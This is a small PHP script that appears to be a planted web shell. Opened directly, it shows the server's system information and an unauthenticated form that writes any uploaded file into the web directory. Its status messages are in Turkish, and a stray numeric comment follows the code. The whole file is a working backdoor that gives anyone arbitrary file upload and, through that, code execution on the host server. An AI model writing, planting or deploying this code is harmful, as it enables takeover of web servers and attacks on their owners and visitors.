<?php
if (realpath($_SERVER['SCRIPT_FILENAME']) == __FILE__) {
echo '<b><br><br>'.php_uname().'<br><br><br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Dosya Basar1yla Upload Edildi..</b><br><br>'; }
else { echo '<b>Upload Basarisiz..</b><br><br>'; }
}
}
?><?php /*1855386*/ ?>